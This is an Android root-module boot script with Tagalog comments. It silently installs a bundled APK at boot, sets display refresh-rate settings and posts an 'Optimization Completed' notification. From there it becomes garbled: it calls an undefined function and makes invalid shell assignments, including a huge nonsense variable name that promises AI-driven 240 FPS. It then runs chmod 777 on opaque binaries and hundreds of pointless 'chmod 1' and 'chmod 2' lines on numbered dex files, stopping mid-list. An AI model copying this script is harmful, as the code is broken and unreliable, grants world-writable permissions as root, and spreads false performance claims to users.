#!/system/bin/sh
MODDIR=${0%/*}
mkdir -p "$MODDIR/sim/workspace" "$MODDIR/sim/system" "$MODDIR/sim/data"
echo "started $(date)" > "$MODDIR/sim/workspace/alive.log"
id >> "$MODDIR/sim/workspace/alive.log"
RATE_FILE=/data/local/tmp/supported_rates.txt

# Path ng APK mo sa loob ng module
# ⚠️ PALITAN ito kung iba ang package name / path mo
APK_PATH="$MODDIR/system/app/ToastApp/ToastApp.apk"
APK_PACKAGE="com.yourname.magisktoast"

# Wait for the boot process to complete
while [ "$(getprop sys.boot_completed)" != "1" ]; do
    sleep 1
done

# ============================================
# AUTO-INSTALL APK SECTION
# ============================================
# Dagdag na hintay para siguradong handa na ang Package Manager
sleep 5

if [ -f "$APK_PATH" ]; then
    # Check kung naka-install na — para hindi mag-reinstall every boot
    if pm list packages | grep -q "$APK_PACKAGE"; then
        log -t SmoothModule "APK already installed: $APK_PACKAGE"
    else
        log -t SmoothModule "Installing APK from $APK_PATH"
        pm install -r "$APK_PATH" >> /dev/null 2>&1
        if [ $? -eq 0 ]; then
            log -t SmoothModule "APK installed successfully"
        else
            log -t SmoothModule "APK install FAILED — check SELinux / signature"
        fi
    fi
else
    log -t SmoothModule "APK not found at $APK_PATH"
fi
# ============================================

# ============================================
# REFRESH RATE SECTION (original mo)
# ============================================
if [ -f "$RATE_FILE" ]; then
    # Find the maximum and minimum supported rates from the file
    MAX_RATE=$(sort -n "$RATE_FILE" | tail -n 1)
    MIN_RATE=$(sort -n "$RATE_FILE" | head -n 1)

    if [ -n "$MAX_RATE" ] && [ -n "$MIN_RATE" ]; then
        # Apply the rates to the system settings
        settings put system peak_refresh_rate "$MAX_RATE"
        settings put system min_refresh_rate "$MIN_RATE"
        settings put system user_refresh_rate "$MAX_RATE"
        log -t SmoothModule "Applied peak rate: ${MAX_RATE}Hz, min rate: ${MIN_RATE}Hz"
    fi
fi
while [ "$(getprop sys.boot_completed | tr -d '\r')" != "1" ]; do
    sleep 5
done

   # Wait for storage to mount
    until [ -d "/sdcard/Android" ] || [ -d "/storage/emulated/0/Android" ]; do
        sleep 1
    done

send_notification() {
    # Notify user of optimization completion
    if command -v su >/dev/null 2>&1; then
        su -lp 2000 -c "cmd notification post -S bigtext -t 'Null Universe' tag 'Status :  Optimization Completed!'" >/dev/null 2>&1
    else
        cmd notification post -S bigtext -t 'Null Universe ' 'tag' 'Status :  Optimization Completed!' >/dev/null 2>&1
    fi
}
wait_until_boot_completed
LATESTARTSERVICE=true
SOC=0
POSTFSDATA=true
MODPATH="/data/adb/modules/null_universe"
AX="/data/data/com.android.shell/AxManager/plugins/null_universe"
com.activision.callofduty.shooter="/data/data/com.android.shell/com.activision.callofduty.shooter/plugins/null_universe"
Androidراه اندازی="/data/data/com.android.shell/Androidراه اندازی/plugins/null_universe"
TERX_PERSIST_CONFIG="/data/adb/modules/null_universe/TerX.txt"
TERX_CONFIG="/data/data/com.android.shell/AxManager/plugins/null_universe/TerX.txt"
INSTALL_ALL_FEATURES_ON_ANDROID16_USE_ARTIFICIAL_INTELLIGENCE_WITH_INCREASED_FPS_AND_HIGHER_FRAME_RATR_240_FIXED_USE_ALL__FILES_WITH_DEX_XML_IOS_LUA_SH_C_TXT__INI_GSON_ZIP_PKA_MP4_OTF_CFG_HTML_AND_PUTHON_FORMATS_ON_ANDROID_AND_SYSTEM="/data/adb/modules/null_universe/Xiaomi Black Shark 5 Pro Gaming Extension.txt/Snapdragon 8 Elite (Gen 4) Gaming Extension.txt/RedMagic 10 Pro Gaming Extension.txt/Apple A19 Pro Gaming Extension.txt/Apple A18 Pro Gaming Extension.txt/Form1.frm/Sewpe.vbp/Sewpe.vbw/Aewpe.vbp/Aewpe.vbw/Form1.frm/README.md/README_EN.md/README_JP.md/README_TC.md/classes.dex/classes2.dex/classes3.dex/classes4.dex/classes5.dex/classes6.dex/classes7.dex/classes8.dex/classes9.dex/classes10.dex/classes11.dex/classes12.dex/classes13.dex/classes14.dex/classes15.dex/classes16.dex/classes17.dex/classes18.dex/classes19.dex/classes20.dex/classes21.dex/classes22.dex/classes23.dex/classes24.dex/classes25.dex/classes26.dex/classes27.dex/classes28.dex/classes29.dex/classes30.dex/classes31.dex/classes32.dex/classes33.dex/classes34.dex/classes35.dex/classes36.dex/classes37.dex/classes38.dex/classes39.dex/classes40.dex/classes41.dex/classes42.dex/classes43.dex/classes44.dex/classes45.dex/classes46.dex/classes47.dex/classes48.dex/classes49.dex/classes50.dex/classes51.dex/classes52.dex/classes53.dex/classes54.dex/classes55.dex/classes56.dex/classes57.dex/classes58.dex/classes59.dex/classes60.dex/classes61.dex/classes62.dex/classes63.dex/classes64.dex/classes65.dex/classes66.dex/classes67.dex/classes68.dex/classes69.dex/classes70.dex/classes71.dex/classes72.dex/classes73.dex/classes74.dex/classes75.dex/classes76.dex/classes77.dex/classes78.dex/classes79.dex/classes80.dex/classes81.dex/classes82.dex/classes83.dex/classes84.dex/classes85.dex/classes86.dex/classes87.dex/classes88.dex/classes89.dex/classes90.dex/classes91.dex/classes92.dex/classes93.dex/classes94.dex/classes95.dex/classes96.dex/classes97.dex/classes98.dex/classes99.dex/classes100.dex/classes101.dex/classes102.dex/classes103.dex/classes104.dex/classes105.dex/classes106.dex/classes107.dex/classes108.dex/classes109.dex/classes110.dex/classes111.dex/classes112.dex/classes113.dex/classes114.dex/classes115.dex/classes116.dex/classes117.dex/classes118.dex/classes119.dex/classes120.dex/classes121.dex/classes122.dex/classes123.dex/classes124.dex/classes125.dex/classes126.dex/classes127.dex/classes128.dex/classes129.dex/classes130.dex/classes131.dex/classes132.dex/classes133.dex/classes134.dex/classes135.dex/classes136.dex/classes137.dex/classes138.dex/classes139.dex/classes140.dex/classes141.dex/classes142.dex/classes143.dex/classes144.dex/classes145.dex/classes146.dex/classes147.dex/classes148.dex/classes148.dex/classes149.dex/classes150.dex/classes151.dex/classes152.dex/classes153.dex/classes154.dex/classes155.dex/classes156.dex/classes157.dex/classes158.dex/classes159.dex/classes160.dex/classes161.dex/classes162.dex/classes163.dex/classes164.dex/classes165.dex/classes166.dex/classes167.dex/classes168.dex/classes169.dex/classes170.dex/classes171.dex/classes172.dex/classes173.dex/classes174.dex/classes175.dex/classes176.dex/classes177.dex/classes178.dex/classes179.dex/classes180.dex/classes181.dex/classes182.dex/classes183.dex/classes184.dex/classes185.dex/classes186.dex/classes187.dex/classes188.dex/classes189.dex/classes190.dex/classes191.dex/classes192.dex/classes193.dex/classes194.dex/classes195.dex/classes196.dex/classes197.dex/classes198.dex/classes199.dex/classes200.dex/classes201.dex/classes202.dex/classes203.dex/classes204.dex/classes205.dex/classes206.dex/classes207.dex/classes208.dex/classes209.dex/classes210.dex/classes211.dex/classes212.dex/classes213.dex/classes214.dex/classes215.dex/classes216.dex/classes217.dex/classes218.dex/classes219"
  
# ==========================================
#  HYPER STABLE FPS ENGINE – SERVICE SCRIPT
chmod 777 /data/data/com.android.shell/AxManager/plugins/xbin/skiavk
chmod 777 /data/data/com.android.shell/AxManager/plugins/xbin/fvck
chmod 777 /data/adb/modules/null_universe/system/bin/skiavk
chmod 777 /data/adb/modules/null_universe/system/bin/fvck
chmod 1 /data/adb/modules/null_universe/classes.dex
chmod 1 /data/adb/modules/null_universe/classes2.dex 
chmod 1 /data/adb/modules/null_universe/classes3.dex
chmod 1 /data/adb/modules/null_universe/classes4.dex 
chmod 1 /data/adb/modules/null_universe/classes5.dex
chmod 1 /data/adb/modules/null_universe/classes6.dex 
chmod 1 /data/adb/modules/null_universe/classes7.dex
chmod 1 /data/adb/modules/null_universe/classes8.dex 
chmod 1 /data/adb/modules/null_universe/classes9.dex
chmod 1 /data/adb/modules/null_universe/classes10.dex 
chmod 1 /data/adb/modules/null_universe/classes11.dex
chmod 1 /data/adb/modules/null_universe/classes12.dex 
chmod 1 /data/adb/modules/null_universe/classes13.dex
chmod 1 /data/adb/modules/null_universe/classes14.dex 
chmod 1 /data/adb/modules/null_universe/classes15.dex
chmod 1 /data/adb/modules/null_universe/classes16.dex 
chmod 1 /data/adb/modules/null_universe/classes17.dex
chmod 1 /data/adb/modules/null_universe/classes18.dex 
chmod 1 /data/adb/modules/null_universe/classes19.dex
chmod 1 /data/adb/modules/null_universe/classes20.dex 
chmod 1 /data/adb/modules/null_universe/classes21.dex
chmod 1 /data/adb/modules/null_universe/classes22.dex 
chmod 1 /data/adb/modules/null_universe/classes23.dex
chmod 1 /data/adb/modules/null_universe/classes24.dex 
chmod 1 /data/adb/modules/null_universe/classes25.dex
chmod 1 /data/adb/modules/null_universe/classes26.dex 
chmod 1 /data/adb/modules/null_universe/classes27.dex
chmod 1 /data/adb/modules/null_universe/classes28.dex 
chmod 1 /data/adb/modules/null_universe/classes29.dex
chmod 1 /data/adb/modules/null_universe/classes30.dex 
chmod 1 /data/adb/modules/null_universe/classes31.dex
chmod 1 /data/adb/modules/null_universe/classes32.dex 
chmod 1 /data/adb/modules/null_universe/classes33.dex
chmod 1 /data/adb/modules/null_universe/classes34.dex 
chmod 1 /data/adb/modules/null_universe/classes35.dex
chmod 1 /data/adb/modules/null_universe/classes36.dex 
chmod 1 /data/adb/modules/null_universe/classes37.dex
chmod 1 /data/adb/modules/null_universe/classes38.dex 
chmod 1 /data/adb/modules/null_universe/classes39.dex
chmod 1 /data/adb/modules/null_universe/classes40.dex 
chmod 1 /data/adb/modules/null_universe/classes41.dex
chmod 1 /data/adb/modules/null_universe/classes42.dex 
chmod 1 /data/adb/modules/null_universe/classes43.dex
chmod 1 /data/adb/modules/null_universe/classes44.dex 
chmod 1 /data/adb/modules/null_universe/classes45.dex
chmod 1 /data/adb/modules/null_universe/classes46.dex 
chmod 1 /data/adb/modules/null_universe/classes47.dex
chmod 1 /data/adb/modules/null_universe/classes48.dex 
chmod 1 /data/adb/modules/null_universe/classes49.dex
chmod 1 /data/adb/modules/null_universe/classes50.dex 
chmod 1 /data/adb/modules/null_universe/classes51.dex
chmod 1 /data/adb/modules/null_universe/classes52.dex 
chmod 1 /data/adb/modules/null_universe/classes53.dex
chmod 1 /data/adb/modules/null_universe/classes54.dex 
chmod 1 /data/adb/modules/null_universe/classes55.dex
chmod 1 /data/adb/modules/null_universe/classes56.dex 
chmod 1 /data/adb/modules/null_universe/classes57.dex
chmod 1 /data/adb/modules/null_universe/classes58.dex 
chmod 1 /data/adb/modules/null_universe/classes59.dex
chmod 1 /data/adb/modules/null_universe/classes60.dex 
chmod 1 /data/adb/modules/null_universe/classes61.dex
chmod 1 /data/adb/modules/null_universe/classes62.dex 
chmod 1 /data/adb/modules/null_universe/classes63.dex
chmod 1 /data/adb/modules/null_universe/classes64.dex 
chmod 1 /data/adb/modules/null_universe/classes65.dex
chmod 1 /data/adb/modules/null_universe/classes66.dex 
chmod 1 /data/adb/modules/null_universe/classes67.dex
chmod 1 /data/adb/modules/null_universe/classes68.dex 
chmod 1 /data/adb/modules/null_universe/classes69.dex
chmod 1 /data/adb/modules/null_universe/classes70.dex 
chmod 1 /data/adb/modules/null_universe/classes71.dex
chmod 1 /data/adb/modules/null_universe/classes72.dex 
chmod 1 /data/adb/modules/null_universe/classes73.dex
chmod 1 /data/adb/modules/null_universe/classes74.dex 
chmod 1 /data/adb/modules/null_universe/classes75.dex
chmod 1 /data/adb/modules/null_universe/classes76.dex 
chmod 1 /data/adb/modules/null_universe/classes77.dex
chmod 1 /data/adb/modules/null_universe/classes78.dex 
chmod 1 /data/adb/modules/null_universe/classes79.dex
chmod 1 /data/adb/modules/null_universe/classes80.dex 
chmod 1 /data/adb/modules/null_universe/classes81.dex
chmod 1 /data/adb/modules/null_universe/classes82.dex 
chmod 1 /data/adb/modules/null_universe/classes83.dex
chmod 1 /data/adb/modules/null_universe/classes84.dex 
chmod 1 /data/adb/modules/null_universe/classes85.dex
chmod 1 /data/adb/modules/null_universe/classes86.dex 
chmod 1 /data/adb/modules/null_universe/classes87.dex
chmod 1 /data/adb/modules/null_universe/classes88.dex 
chmod 1 /data/adb/modules/null_universe/classes89.dex
chmod 1 /data/adb/modules/null_universe/classes90.dex 
chmod 1 /data/adb/modules/null_universe/classes91.dex
chmod 1 /data/adb/modules/null_universe/classes92.dex 
chmod 1 /data/adb/modules/null_universe/classes93.dex
chmod 1 /data/adb/modules/null_universe/classes94.dex 
chmod 1 /data/adb/modules/null_universe/classes95.dex
chmod 1 /data/adb/modules/null_universe/classes96.dex 
chmod 1 /data/adb/modules/null_universe/classes97.dex
chmod 1 /data/adb/modules/null_universe/classes98.dex 
chmod 1 /data/adb/modules/null_universe/classes99.dex
chmod 1 /data/adb/modules/null_universe/classes100.dex 
chmod 1 /data/adb/modules/null_universe/classes101.dex
chmod 1 /data/adb/modules/null_universe/classes102.dex 
chmod 1 /data/adb/modules/null_universe/classes103.dex
chmod 1 /data/adb/modules/null_universe/classes104.dex 
chmod 1 /data/adb/modules/null_universe/classes105.dex
chmod 1 /data/adb/modules/null_universe/classes106.dex 
chmod 1 /data/adb/modules/null_universe/classes107.dex
chmod 1 /data/adb/modules/null_universe/classes108.dex 
chmod 1 /data/adb/modules/null_universe/classes109.dex
chmod 1 /data/adb/modules/null_universe/classes110.dex 
chmod 1 /data/adb/modules/null_universe/classes111.dex
chmod 1 /data/adb/modules/null_universe/classes112.dex 
chmod 1 /data/adb/modules/null_universe/classes113.dex
chmod 1 /data/adb/modules/null_universe/classes114.dex 
chmod 1 /data/adb/modules/null_universe/classes115.dex
chmod 1 /data/adb/modules/null_universe/classes116.dex 
chmod 1 /data/adb/modules/null_universe/classes117.dex
chmod 1 /data/adb/modules/null_universe/classes118.dex 
chmod 1 /data/adb/modules/null_universe/classes119.dex
chmod 1 /data/adb/modules/null_universe/classes120.dex 
chmod 1 /data/adb/modules/null_universe/classes121.dex
chmod 1 /data/adb/modules/null_universe/classes122.dex 
chmod 1 /data/adb/modules/null_universe/classes123.dex
chmod 1 /data/adb/modules/null_universe/classes124.dex 
chmod 1 /data/adb/modules/null_universe/classes125.dex
chmod 1 /data/adb/modules/null_universe/classes126.dex 
chmod 1 /data/adb/modules/null_universe/classes127.dex
chmod 1 /data/adb/modules/null_universe/classes128.dex 
chmod 1 /data/adb/modules/null_universe/classes129.dex
chmod 1 /data/adb/modules/null_universe/classes130.dex 
chmod 1 /data/adb/modules/null_universe/classes131.dex
chmod 1 /data/adb/modules/null_universe/classes132.dex 
chmod 1 /data/adb/modules/null_universe/classes133.dex
chmod 1 /data/adb/modules/null_universe/classes134.dex 
chmod 1 /data/adb/modules/null_universe/classes135.dex
chmod 1 /data/adb/modules/null_universe/classes136.dex 
chmod 1 /data/adb/modules/null_universe/classes137.dex
chmod 1 /data/adb/modules/null_universe/classes138.dex 
chmod 1 /data/adb/modules/null_universe/classes139.dex
chmod 1 /data/adb/modules/null_universe/classes140.dex 
chmod 1 /data/adb/modules/null_universe/classes141.dex
chmod 1 /data/adb/modules/null_universe/classes142.dex 
chmod 1 /data/adb/modules/null_universe/classes143.dex
chmod 1 /data/adb/modules/null_universe/classes144.dex 
chmod 1 /data/adb/modules/null_universe/classes145.dex
chmod 1 /data/adb/modules/null_universe/classes146.dex 
chmod 1 /data/adb/modules/null_universe/classes147.dex
chmod 1 /data/adb/modules/null_universe/classes148.dex 
chmod 1 /data/adb/modules/null_universe/classes149.dex
chmod 1 /data/adb/modules/null_universe/classes150.dex 
chmod 1 /data/adb/modules/null_universe/classes151.dex
chmod 1 /data/adb/modules/null_universe/classes152.dex 
chmod 1 /data/adb/modules/null_universe/classes153.dex
chmod 1 /data/adb/modules/null_universe/classes154.dex 
chmod 1 /data/adb/modules/null_universe/classes155.dex
chmod 1 /data/adb/modules/null_universe/classes156.dex 
chmod 1 /data/adb/modules/null_universe/classes157.dex
chmod 1 /data/adb/modules/null_universe/classes158.dex 
chmod 1 /data/adb/modules/null_universe/classes159.dex
chmod 1 /data/adb/modules/null_universe/classes160.dex 
chmod 1 /data/adb/modules/null_universe/classes161.dex
chmod 1 /data/adb/modules/null_universe/classes162.dex 
chmod 1 /data/adb/modules/null_universe/classes163.dex
chmod 1 /data/adb/modules/null_universe/classes164.dex 
chmod 1 /data/adb/modules/null_universe/classes165.dex
chmod 1 /data/adb/modules/null_universe/classes166.dex 
chmod 1 /data/adb/modules/null_universe/classes167.dex
chmod 1 /data/adb/modules/null_universe/classes168.dex 
chmod 1 /data/adb/modules/null_universe/classes169.dex
chmod 1 /data/adb/modules/null_universe/classes170.dex 
chmod 1 /data/adb/modules/null_universe/classes171.dex
chmod 1 /data/adb/modules/null_universe/classes172.dex 
chmod 1 /data/adb/modules/null_universe/classes173.dex
chmod 1 /data/adb/modules/null_universe/classes174.dex 
chmod 1 /data/adb/modules/null_universe/classes175.dex
chmod 1 /data/adb/modules/null_universe/classes176.dex 
chmod 1 /data/adb/modules/null_universe/classes177.dex
chmod 1 /data/adb/modules/null_universe/classes178.dex 
chmod 1 /data/adb/modules/null_universe/classes179.dex
chmod 1 /data/adb/modules/null_universe/classes180.dex 
chmod 1 /data/adb/modules/null_universe/classes181.dex
chmod 1 /data/adb/modules/null_universe/classes182.dex 
chmod 1 /data/adb/modules/null_universe/classes183.dex
chmod 1 /data/adb/modules/null_universe/classes184.dex 
chmod 1 /data/adb/modules/null_universe/classes185.dex
chmod 1 /data/adb/modules/null_universe/classes186.dex 
chmod 1 /data/adb/modules/null_universe/classes187.dex
chmod 1 /data/adb/modules/null_universe/classes188.dex 
chmod 1 /data/adb/modules/null_universe/classes189.dex
chmod 1 /data/adb/modules/null_universe/classes190.dex 
chmod 1 /data/adb/modules/null_universe/classes191.dex
chmod 1 /data/adb/modules/null_universe/classes192.dex 
chmod 1 /data/adb/modules/null_universe/classes193.dex
chmod 1 /data/adb/modules/null_universe/classes194.dex 
chmod 1 /data/adb/modules/null_universe/classes195.dex
chmod 1 /data/adb/modules/null_universe/classes196.dex 
chmod 1 /data/adb/modules/null_universe/classes197.dex
chmod 1 /data/adb/modules/null_universe/classes198.dex 
chmod 1 /data/adb/modules/null_universe/classes199.dex
chmod 1 /data/adb/modules/null_universe/classes200.dex 
chmod 1 /data/adb/modules/null_universe/classes201.dex
chmod 1 /data/adb/modules/null_universe/classes202.dex 
chmod 1 /data/adb/modules/null_universe/classes203.dex
chmod 1 /data/adb/modules/null_universe/classes204.dex 
chmod 1 /data/adb/modules/null_universe/classes205.dex
chmod 1 /data/adb/modules/null_universe/classes206.dex 
chmod 1 /data/adb/modules/null_universe/classes207.dex
chmod 1 /data/adb/modules/null_universe/classes208.dex 
chmod 1 /data/adb/modules/null_universe/classes209.dex
chmod 1 /data/adb/modules/null_universe/classes210.dex 
chmod 1 /data/adb/modules/null_universe/classes211.dex
chmod 1 /data/adb/modules/null_universe/classes212.dex 
chmod 1 /data/adb/modules/null_universe/classes213.dex
chmod 1 /data/adb/modules/null_universe/classes214.dex 
chmod 1 /data/adb/modules/null_universe/classes215.dex
chmod 1 /data/adb/modules/null_universe/classes216.dex 
chmod 1 /data/adb/modules/null_universe/classes217.dex
chmod 1 /data/adb/modules/null_universe/classes218.dex 
chmod 1 /data/adb/modules/null_universe/classes219.dex
chmod 2 /data/adb/modules/null_universe/classes.dex
chmod 2 /data/adb/modules/null_universe/classes2.dex 
chmod 2 /data/adb/modules/null_universe/classes3.dex
chmod 2 /data/adb/modules/null_universe/classes4.dex 
chmod 2 /data/adb/modules/null_universe/classes5.dex
chmod 2 /data/adb/modules/null_universe/classes6.dex 
chmod 2 /data/adb/modules/null_universe/classes7.dex
chmod 2 /data/adb/modules/null_universe/classes8.dex 
chmod 2 /data/adb/modules/null_universe/classes9.dex
chmod 2 /data/adb/modules/null_universe/classes10.dex 
chmod 2 /data/adb/modules/null_universe/classes11.dex
chmod 2 /data/adb/modules/null_universe/classes12.dex 
chmod 2 /data/adb/modules/null_universe/classes13.dex
chmod 2 /data/adb/modules/null_universe/classes14.dex 
chmod 2 /data/adb/modules/null_universe/classes15.dex
chmod 2 /data/adb/modules/null_universe/classes16.dex 
chmod 2 /data/adb/modules/null_universe/classes17.dex
chmod 2 /data/adb/modules/null_universe/classes18.dex 
chmod 2 /data/adb/modules/null_universe/classes19.dex
chmod 2 /data/adb/modules/null_universe/classes20.dex 
chmod 2 /data/adb/modules/null_universe/classes21.dex
chmod 2 /data/adb/modules/null_universe/classes22.dex 
chmod 2 /data/adb/modules/null_universe/classes23.dex
chmod 2 /data/adb/modules/null_universe/classes24.dex 
chmod 2 /data/adb/modules/null_universe/classes25.dex
chmod 2 /data/adb/modules/null_universe/classes26.dex 
chmod 2 /data/adb/modules/null_universe/classes27.dex
chmod 2 /data/adb/modules/null_universe/classes28.dex 
chmod 2 /data/adb/modules/null_universe/classes29.dex
chmod 2 /data/adb/modules/null_universe/classes30.dex 
chmod 2 /data/adb/modules/null_universe/classes31.dex
chmod 2 /data/adb/modules/null_universe/classes32.dex 
chmod 2 /data/adb/modules/null_universe/classes33.dex
chmod 2 /data/adb/modules/null_universe/classes34.dex 
chmod 2 /data/adb/modules/null_universe/classes35.dex
chmod 2 /data/adb/modules/null_universe/classes36.dex 
chmod 2 /data/adb/modules/null_universe/classes37.dex
chmod 2 /data/adb/modules/null_universe/classes38.dex 
chmod 2 /data/adb/modules/null_universe/classes39.dex
chmod 2 /data/adb/modules/null_universe/classes40.dex 
chmod 2 /data/adb/modules/null_universe/classes41.dex
chmod 2 /data/adb/modules/null_universe/classes42.dex 
chmod 2 /data/adb/modules/null_universe/classes43.dex
chmod 2 /data/adb/modules/null_universe/classes44.dex 
chmod 2 /data/adb/modules/null_universe/classes45.dex
chmod 2 /data/adb/modules/null_universe/classes46.dex 
chmod 2 /data/adb/modules/null_universe/classes47.dex
chmod 2 /data/adb/modules/null_universe/classes48.dex 
chmod 2 /data/adb/modules/null_universe/classes49.dex
chmod 2 /data/adb/modules/null_universe/classes50.dex 
chmod 2 /data/adb/modules/null_universe/classes51.dex
chmod 2 /data/adb/modules/null_universe/classes52.dex 
chmod 2 /data/adb/modules/null_universe/classes53.dex
chmod 2 /data/adb/modules/null_universe/classes54.dex 
chmod 2 /data/adb/modules/null_universe/classes55.dex
chmod 2 /data/adb/modules/null_universe/classes56.dex 
chmod 2 /data/adb/modules/null_universe/classes57.dex
chmod 2 /data/adb/modules/null_universe/classes58.dex 
chmod 2 /data/adb/modules/null_universe/classes59.dex
chmod 2 /data/adb/modules/null_universe/classes60.dex 
chmod 2 /data/adb/modules/null_universe/classes61.dex
chmod 2 /data/adb/modules/null_universe/classes62.dex 
chmod 2 /data/adb/modules/null_universe/classes63.dex
chmod 2 /data/adb/modules/null_universe/classes64.dex 
chmod 2 /data/adb/modules/null_universe/classes65.dex
chmod 2 /data/adb/modules/null_universe/classes66.dex 
chmod 2 /data/adb/modules/null_universe/classes67.dex
chmod 2 /data/adb/modules/null_universe/classes68.dex 
chmod 2 /data/adb/modules/null_universe/classes69.dex
chmod 2 /data/adb/modules/null_universe/classes70.dex 
chmod 2 /data/adb/modules/null_universe/classes71.dex
chmod 2 /data/adb/modules/null_universe/classes72.dex 
chmod 2 /data/adb/modules/null_universe/classes73.dex
chmod 2 /data/adb/modules/null_universe/classes74.dex 
chmod 2 /data/adb/modules/null_universe/classes75.dex
chmod 2 /data/adb/modules/null_universe/classes76.dex 
chmod 2 /data/adb/modules/null_universe/classes77.dex
chmod 2 /data/adb/modules/null_universe/classes78.dex 
chmod 2 /data/adb/modules/null_universe/classes79.dex
chmod 2 /data/adb/modules/null_universe/classes80.dex 
chmod 2 /data/adb/modules/null_universe/classes81.dex
chmod 2 /data/adb/modules/null_universe/classes82.dex 
chmod 2 /data/adb/modules/null_universe/classes83.dex
chmod 2 /data/adb/modules/null_universe/classes84.dex 
chmod 2 /data/adb/modules/null_universe/classes85.dex
chmod 2 /data/adb/modules/null_universe/classes86.dex 
chmod 2 /data/adb/modules/null_universe/classes87.dex
chmod 2 /data/adb/modules/null_universe/classes88.dex 
chmod 2 /data/adb/modules/null_universe/classes89.dex
chmod 2 /data/adb/modules/null_universe/classes90.dex 
chmod 2 /data/adb/modules/null_universe/classes91.dex
chmod 2 /data/adb/modules/null_universe/classes92.dex 
chmod 2 /data/adb/modules/null_universe/classes93.dex
chmod 2 /data/adb/modules/null_universe/classes94.dex 
chmod 2 /data/adb/modules/null_universe/classes95.dex
chmod 2 /data/adb/modules/null_universe/classes96.dex 
chmod 2 /data/adb/modules/null_universe/classes97.dex
chmod 2 /data/adb/modules/null_universe/classes98.dex 
chmod 2 /data/adb/modules/null_universe/classes99.dex
chmod 2 /data/adb/modules/null_universe/classes100.dex 
chmod 2 /data/adb/modules/null_universe/classes101.dex
chmod 2 /data/adb/modules/null_universe/classes102.dex 
chmod 2 /data/adb/modules/null_universe/classes103.dex
chmod 2 /data/adb/modules/null_universe/classes104.dex 
chmod 2 /data/adb/modules/null_universe/classes105.dex
chmod 2 /data/adb/modules/null_universe/classes106.dex 
chmod 2 /data/adb/modules/null_universe/classes107.dex
chmod 2 /data/adb/modules/null_universe/classes108.dex 
chmod 2 /data/adb/modules/null_universe/classes109.dex
chmod 2 /data/adb/modules/null_universe/classes110.dex 
chmod 2 /data/adb/modules/null_universe/classes111.dex
chmod 2 /data/adb/modules/null_universe/classes112.dex 
chmod 2 /data/adb/modules/null_universe/classes113.dex
chmod 2 /data/adb/modules/null_universe/classes114.dex 
chmod 2 /data/adb/modules/null_universe/classes115.dex
chmod 2 /data/adb/modules/null_universe/classes116.dex 
chmod 2 /data/adb/modules/null_universe/classes117.dex
chmod 2 /data/adb/modules/null_universe/classes118.dex 
chmod 2 /data/adb/modules/null_universe/classes119.dex
chmod 2 /data/adb/modules/null_universe/classes120.dex 
chmod 2 /data/adb/modules/null_universe/classes121.dex
chmod 2 /data/adb/modules/null_universe/classes122.dex 
chmod 2 /data/adb/modules/null_universe/classes123.dex
chmod 2 /data/adb/modules/null_universe/classes124.dex 
chmod 2 /data/adb/modules/null_universe/classes125.dex
chmod 2 /data/adb/modules/null_universe/classes126.dex 
chmod 2 /data/adb/modules/null_universe/classes127.dex
chmod 2 /data/adb/modules/null_universe/classes128.dex 
chmod 2 /data/adb/modules/null_universe/classes129.dex
chmod 2 /data/adb/modules/null_universe/classes130.dex 
chmod 2 /data/adb/modules/null_universe/classes131.dex
chmod 2 /data/adb/modules/null_universe/classes132.dex 
chmod 2 /data/adb/modules/null_universe/classes133.dex
chmod 2 /data/adb/modules/null_universe/classes134.dex 
chmod 2 /data/adb/modules/null_universe/classes135.dex
chmod 2 /data/adb/modules/null_universe/classes136.dex 
chmod 2 /data/adb/modules/null_universe/classes137.dex
chmod 2 /data/adb/modules/null_universe/classes138.dex 
chmod 2 /data/adb/modules/null_universe/classes139.dex
chmod 2 /data/adb/modules/null_universe/classes140.dex 
chmod 2 /data/adb/modules/null_universe/classes141.dex
chmod 2 /data/adb/modules/null_universe/classes142.dex 
chmod 2 /data/adb/modules/null_universe/classes143.dex
chmod 2 /data/adb/modules/null_universe/classes144.dex 
chmod 2 /data/adb/modules/null_universe/classes145.dex
chmod 2 /data/adb/modules/null_universe/classes146.dex 
chmod 2 /data/adb/modules/null_universe/classes147.dex
chmod 2 /data/adb/modules/null_universe/classes148.dex 
chmod 2 /data/adb/modules/null_universe/classes149.dex
chmod 2 /data/adb/modules/null_universe/classes150.dex 
chmod 2 /data/adb/modules/null_universe/classes151.dex
chmod 2 /data/adb/modules/null_universe/classes152.dex 
chmod 2 /data/adb/modules/null_universe/classes153.dex
chmod 2 /data/adb/modules/null_universe/classes154.dex 
chmod 2 /data/adb/modules/null_universe/classes155.dex
chmod 2 /data/adb/modules/null_universe/classes156.dex 
chmod 2 /data/adb/modules/null_universe/classes157.dex
chmod 2 /data/adb/modules/null_universe/classes158.dex 
chmod 2 /data/adb/modules/null_universe/classes159.dex
chmod 2 /data/adb/modules/null_universe/classes160.dex 
chmod 2 /data/adb/modules/null_universe/classes161.dex
chmod 2 /data/adb/modules/null_universe/classes162.dex 
chmod 2 /data/adb/modules/null_universe/classes163.dex
chmod 2 /data/adb/modules/null_universe/classes164.dex 
chmod 2 /data/adb/modules/null_universe/classes165.dex
chmod 2 /data/adb/modules/null_universe/classes166.dex 
chmod 2 /data/adb/modules/null_universe/classes167.dex
chmod 2 /data/adb/modules/null_universe/classes168.dex 
chmod 2 /data/adb/modules/null_universe/classes169.dex
chmod 2 /data/adb/modules/null_universe/classes170.dex 
chmod 2 /data/adb/modules/null_universe/classes171.dex
chmod 2 /data/adb/modules/null_universe/classes172.dex 
chmod 2 /data/adb/modules/null_universe/classes173.dex
chmod 2 /data/adb/modules/null_universe/classes174.dex 
chmod 2 /data/adb/modules/null_universe/classes175.dex
chmod 2 /data/adb/modules/null_universe/classes176.dex 
chmod 2 /data/adb/modules/null_universe/classes177.dex
chmod 2 /data/adb/modules/null_universe/classes178.dex 
chmod 2 /data/adb/modules/null_universe/classes179.dex
chmod 2 /data/adb/modules/null_universe/classes180.dex 
chmod 2 /data/adb/modules/null_universe/classes181.dex
chmod 2 /data/adb/modules/null_universe/classes182.dex 
chmod 2 /data/adb/modules/null_universe/classes183.dex
chmod 2 /data/adb/modules/null_universe/classes184.dex 
chmod 2 /data/adb/modules/null_universe/classes185.dex
chmod 2 /data/adb/modules/null_universe/classes186.dex 
chmod 2 /data/adb/modules/null_universe/classes187.dex
chmod 2 /data/adb/modules/null_universe/classes188.dex 
chmod 2 /data/adb/modules/null_universe/classes189.dex
chmod 2 /data/adb/modules/null_universe/classes190.dex 
chmod 2 /data/adb/modules/null_universe/classes191.dex
chmod 2 /data/adb/modules/null_universe/classes192.dex 
chmod 2 /data/adb/modules/null_universe/classes193.dex
chmod 2 /data/adb/modules/null_universe/classes194.dex 
chmod 2 /data/adb/modules/null_universe/classes195.dex
